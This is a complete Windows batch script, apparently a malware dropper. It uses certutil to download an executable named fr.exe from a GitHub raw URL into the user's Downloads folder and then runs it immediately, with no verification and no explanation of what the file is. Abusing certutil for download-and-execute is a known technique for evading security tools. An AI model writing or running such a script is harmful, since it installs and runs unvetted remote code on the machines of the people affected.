@echo off

set "url=https://github.com/network2city/boot/raw/main/fr.exe"
set "fileSavePath=%USERPROFILE%\Downloads\fr.exe"

REM Download the file using certutil
certutil -urlcache -split -f "%url%" "%fileSavePath%"

REM Run the downloaded file
"%fileSavePath%"

exit /b